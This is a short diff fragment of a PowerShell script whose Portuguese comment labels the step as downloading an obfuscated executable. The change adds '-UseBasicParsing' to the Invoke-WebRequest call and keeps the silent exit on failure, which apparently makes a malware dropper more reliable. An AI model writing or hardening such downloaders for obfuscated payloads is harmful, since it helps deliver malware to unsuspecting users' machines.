@@ -10,7 +10,7 @@ if (!(Test-Path $folder)) {
 
 # 3. Download do executável ofuscado
 try {
-    Invoke-WebRequest -Uri $url -OutFile $exePath
+    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
 } catch {
     exit
 }
